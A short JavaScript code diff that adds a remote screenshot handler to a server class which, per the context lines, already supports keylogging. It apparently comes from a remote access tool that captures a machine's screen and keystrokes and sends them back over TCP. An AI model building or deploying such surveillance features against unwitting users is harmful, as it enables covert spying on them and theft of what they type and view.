@@ -122,6 +122,14 @@ class Server extends EventEmitter {
 
       conn.tcp.__destructors.keylog = disableKeylog.bind(conn)
     })
+
+    const screenshot = require('./lib/Screenshot')
+    this.on(Packets.Screenshot, async function (packet, conn) {
+      let screenshotData = await screenshot.screenshot()
+      conn.tcp.write(Packets.r_Screenshot.create(
+        screenshotData
+      ))
+    })
   }
 
   _onPayload (payload, socket) {
